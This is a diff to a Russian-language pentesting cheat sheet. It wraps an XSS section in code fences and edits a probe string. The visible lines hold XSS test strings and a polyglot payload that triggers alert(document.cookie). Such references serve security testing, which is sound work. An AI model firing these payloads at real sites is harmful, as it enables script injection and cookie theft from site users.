@@ -15,9 +15,9 @@ d - (Оператор LIKE)
 
 **XSS**
 
+```
 '":;<>/\[]<script><h1>
-  
-'';!--"<XSS>=&{()}
+''`;!--"<XSS>=&{()}
 
 < - &lt;
 > - &gt;
@@ -77,6 +77,8 @@ XSS с помощью css:
 
 Polyglot XSS - Mathias Karlsson
 " onclick=alert(document.cookie)//<button ‘ onclick=alert(document.cookie)//> */ alert(1)//
+
+```
 
 **Authentication bypass**
 
